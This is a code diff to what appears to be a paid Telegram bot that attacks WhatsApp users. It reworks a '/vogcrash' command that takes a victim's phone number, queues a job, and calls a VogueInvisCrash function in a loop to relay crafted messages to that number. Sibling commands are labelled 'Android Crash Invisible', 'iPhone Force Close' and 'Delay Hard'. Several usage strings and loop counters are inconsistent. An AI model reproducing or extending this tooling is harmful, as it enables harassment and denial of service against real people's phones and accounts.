@@ -5006,6 +5006,122 @@ The system was unable to execute the requested module.`
         }
 });
 
+bot.command('vogcrash', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+        let q =
+            ctx.message?.text
+            ?.split(" ")[1];
+
+        if (!q) {
+
+            return ctx.reply(
+`Invalid Format
+
+Usage:
+/voguehard <target_number>
+
+Example:
+/voguehard 628xxxxxxxx`
+            );
+        }
+
+        let clean =
+            q.replace(
+                /[^0-9]/g,
+                ""
+            );
+
+        let target =
+            clean +
+            "@s.whatsapp.net";
+            
+        const jobId =
+            Date.now() +
+            Math.floor(Math.random() * 9999);
+
+        try {
+
+            addQueue({
+                id: jobId,
+                type: "vogcrash",
+                target,
+                number: clean,
+                createdAt: Date.now()
+            });
+            
+            const queuePos =
+                spamQueue.findIndex(
+                    x => x.id === jobId
+                ) + 1;
+            
+            const TASK_DURATION =
+                (30 * 4000) +
+                (3 * 60 * 1000);
+            
+            const estimatedMs =
+                (queuePos - 1) *
+                TASK_DURATION;
+            
+            const nextQueueTime =
+                moment(
+                    Date.now() + estimatedMs
+                )
+                .tz("Asia/Jakarta")
+                .format("HH:mm:ss");
+                
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption:
+    `\`\`\`ruby
+V O G U E • C R A S H E R
+────────────────────────
+Q U E U E • S T A T U S
+
+Target      : ${clean}
+Queue       : #${queuePos}
+Next Run    : ${nextQueueTime} WIB
+State       : Added To Queue
+Description : Delay Hard Invisible V2
+────────────────────────
+\`\`\``,
+                    parse_mode:
+                        "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text:
+                                        "Check Target",
+
+                                    url:
+`https://wa.me/${clean}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+
+            processSpamQueue();
+
+        } catch (error) {
+
+            ctx.reply(
+`Operation Failed
+
+The system was unable to execute the requested module.`
+            );
+
+            console.log(
+                `[VOGUE CRASHER] ${error.message}`
+            );
+
+            await restartBot(
+                "Connection Closed"
+            );
+        }
+});
+
 bot.command('spamandro', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -5082,85 +5198,6 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('vogcrash', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
-    
-    let q = ctx.message?.text?.split(" ")[1];
-    
-    if (!q) return ctx.reply(
-        `Invalid Format
-
-Usage:
-/spamandro <target_number>
-
-Example:
-/spamandro 628xxxxxxxx`
-    );
-    
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    
-    try {
-        
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
-\`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Status      : Success
-Description : Android Crash Invisible
-
-──────────────────────────
-\`\`\``,
-            parse_mode: "markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
-        
-        (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let i = 0; i < 10; i++) {
-                try {
-                    await VogueInvisCrash(sock, target);
-                    process.stdout.write(`\r[VOGUE CRASHER] Sent ${i + 1}/10...`);
-                    await sleep(2000);
-                } catch (e) {
-                    console.log(`\n[WORKER ${instanceId}] Error: ${e.message}`);
-                    await restartBot("Connection Closed");
-                }
-            }
-            
-            process.stdout.write("\n");
-            
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
-            
-        })();
-        
-    } catch (error) {
-        
-        ctx.reply(
-            `Operation Failed
-
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
-        );
-        
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
-        await restartBot("Connection Closed");
-    }
-});
-
 bot.command('spamiphone', checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -5209,7 +5246,7 @@ Description : iPhone Force Close
         
         setImmediate(async () => {
             const instanceId = Date.now() + Math.random();
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 5; i++) {
                 
                 try {
                     if (!sock) {
@@ -5462,6 +5499,42 @@ async function processSpamQueue() {
             }
             
             else if (
+                type === "vogcrash"
+            ) {
+                
+                for (let i = 0; i < 10; i++) {
+                    
+                    try {
+                        
+                        await VogueInvisCrash(
+                            sock,
+                            target
+                        );
+                        
+                        console.log(
+                            `[VOGUE CRASH ${id}] Loop ${i + 1}/30`
+                        );
+                        
+                        await sleep(
+                            3000
+                        );
+                        
+                    } catch (e) {
+                        
+                        console.log(
+                            `[VOGUE CRASH ${id}] ${e.message}`
+                        );
+                        
+                        await restartBot(
+                            "Connection Closed"
+                        );
+                        
+                        break;
+                    }
+                }
+            }
+            
+            else if (
                 type === "voguehard"
             ) {
                 
@@ -5473,13 +5546,13 @@ async function processSpamQueue() {
                     );
                     
                     console.log(
-                        `[DELAYCOMBO ${id}] Drainet sent`
+                        `[VOGUE HARD ${id}] Drainet sent`
                     );
                     
                 } catch (e) {
                     
                     console.log(
-                        `[DELAYCOMBO ${id}] Drainet Error ${e.message}`
+                        `[VOGUE HARD ${id}] Drainet Error ${e.message}`
                     );
                 }
                 
@@ -5493,7 +5566,7 @@ async function processSpamQueue() {
                         );
                         
                         console.log(
-                            `[DELAYCOMBO ${id}] Loop ${i + 1}/50`
+                            `[VOGUE HARD ${id}] Loop ${i + 1}/50`
                         );
                         
                         await sleep(
@@ -5503,7 +5576,7 @@ async function processSpamQueue() {
                     } catch (e) {
                         
                         console.log(
-                            `[DELAYCOMBO ${id}] ${e.message}`
+                            `[VOGUE HARD ${id}] ${e.message}`
                         );
                         
                         await restartBot(
@@ -6007,7 +6080,6 @@ async function VogueInvisCrash(sock, target) {
     await sock.relayMessage(target, payload, {
         participant: { jid: target }
     });
-    console.log("SENT")
 }
 //     _       ___  _   _ _   _ _____  _   _        
 //    | |     / _ \| | | | \ | /  __ \| | | |       
